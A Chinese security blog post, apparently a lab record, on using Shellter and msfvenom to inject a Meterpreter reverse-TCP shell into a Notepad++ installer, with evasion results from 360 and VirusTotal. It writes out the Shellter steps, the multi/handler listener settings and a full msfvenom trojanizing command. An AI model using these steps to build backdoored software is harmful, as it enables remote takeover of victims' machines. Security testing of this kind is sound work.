---
title: "Shellter 安装与使用"
date: 2022-4-16 18:10:24
tags: ["Shellter", "Metasploit", "免杀"]
categories:
  - ["网络安全", "安全实验"]
cover: https://res.cloudinary.com/sycamore/image/upload/v1792216256/Covers/d9bcdac19a99f14fe88a3ed9e829d637.png
updated: 2026-10-20 10:53:55
---

Shellter 使用动态 shellcode 注入的方式修改程序。本文记录它的安装、操作过程，以及在 Win 7 虚拟机中的检测结果。
<!-- more -->

:::info
本文使用截图中的 Shellter 7.2，实验环境为 Kali Linux 和安装了 360 安全软件的 Win 7 x64 虚拟机。文中的检测结果来自这次实验，不代表当前版本的检测表现。
:::

## Shellter 安装

在 Kali 中通过 Wine 运行 Shellter，需要先添加 i386 架构支持并安装依赖。截图使用的是 root 账户，安装命令如下：

1. 添加 i386 架构，更新软件包索引并安装 Wine 依赖：

   `dpkg --add-architecture i386 && apt update && apt -y install wine32`

2. 安装 Shellter：`apt install shellter`。

![在 Kali 中安装 Shellter 7.2](https://res.cloudinary.com/sycamore/image/upload/v1792085290/Typora/2023/04/0c4297a033272d1212d9cb86e4daf005.png)

## shellter 使用

这次使用自动模式，将 `Meterpreter_Reverse_TCP` 注入测试程序。下面按界面中的提示记录操作过程。

1. 在命令行输入 `shellter`，打开工具。
2. 输入 `A` 或 `a`，选择自动模式。
3. 在 `PE Target:` 后输入测试程序的文件路径。

![启动 Shellter，选择自动模式和测试程序](https://res.cloudinary.com/sycamore/image/upload/v1792085295/Typora/2023/04/272fa29e9da9d004a3cf25b87079f7de.png)

4. 在 `Enable Stealth Mode?` 提示后输入 `Y`。

![Shellter 的 Stealth Mode 提示](https://res.cloudinary.com/sycamore/image/upload/v1792085286/Typora/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png)

5. 输入 `L`，使用界面列出的 payload。
6. 选择编号 `1`，对应 `Meterpreter_Reverse_TCP`。

![从列表中选择 Meterpreter_Reverse_TCP](https://res.cloudinary.com/sycamore/image/upload/v1792085284/Typora/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png)

7. 分别输入监听端的 IP 地址和端口号。

![填写监听端地址和端口](https://res.cloudinary.com/sycamore/image/upload/v1792085280/Typora/2023/04/396417290b20f351cc3c1d96669a3c4e.png)

8. 等待界面显示 `Injection: Verified!`，按回车继续，结束本次操作。

![Shellter 显示注入验证结果](https://res.cloudinary.com/sycamore/image/upload/v1792085280/Typora/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png)

> **处理后的文件会替换原路径下的文件，文件名保持不变。** 本文环境中的原文件备份位于 `/root/Shellter_Backups/`。

![处理后的文件与 Shellter_Backups 中的原文件备份](https://res.cloudinary.com/sycamore/image/upload/v1792085276/Typora/2023/04/9b58fed5ce217d4b84967579f2522d55.png)

## 利用 & 免杀效果

### 利用

文件处理完成后，我将它传到 Win 7 x64 虚拟机，在 Kali 中打开 `msfconsole`，使用下面的配置监听连接：

- `use exploit/multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.158.139`
- `set LPORT 4444`
- `run`

运行测试程序后，监听端收到连接并建立了 Meterpreter 会话：

![监听端建立 Meterpreter 会话的实验结果](https://res.cloudinary.com/sycamore/image/upload/v1792085276/Typora/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png)

### 免杀效果

实验的 Win 7 x64 虚拟机安装了 360 安全软件。这次检查文件时没有看到告警，运行程序并建立 Meterpreter 会话后，也没有立即弹出提示。大约一分钟后，才出现下面的木马警告：

![360 安全软件弹出的木马警告](https://res.cloudinary.com/sycamore/image/upload/v1792085272/Typora/2023/04/69719cbb27c9df97660f0c6405be89c7.png)

观察到的警告有延迟，但不能据此认定样本不会被检测。再次遇到同一样本时，警告似乎更快。不过这次观察不足以判断每次检测的反应时间。

我还将样本提交到了 VirusTotal。下图显示，Shellter 处理后的样本有 **31 / 70** 个引擎报出检测结果：[查看报告](https://www.virustotal.com/gui/file/e4e97bef85f3970d42e81d6f75815050d7ff2370790888fe9d78948bc83b30a7)。

![Shellter 样本的 VirusTotal 检测结果为 31/70](https://res.cloudinary.com/sycamore/image/upload/v1792085272/Typora/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png)

为了对比，我使用同一个程序和相同的 payload，通过 msfvenom 的模板方式生成了另一个样本。使用的命令如下：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe > mp_npp.exe
```

这个样本在截图中的检测结果为 **40 / 70**：[查看报告](https://www.virustotal.com/gui/file/c3a7c2280e4aa9aa0693729049f7f8e0ff05e253c1047ef282748c3509687207)。

![msfvenom 样本的 VirusTotal 检测结果为 40/70](https://res.cloudinary.com/sycamore/image/upload/v1792085277/Typora/2023/04/c0631de31f6d8f365c052ec14a014b37.png)

这两张报告中，Shellter 样本被报出的次数较少，但两份样本都被多个引擎检测到。

本文仅为 Shellter 工具使用的一次简单实验记录。仅一次对比不足以证明某个工具的效果，检测结果也会随引擎和特征库更新而变化。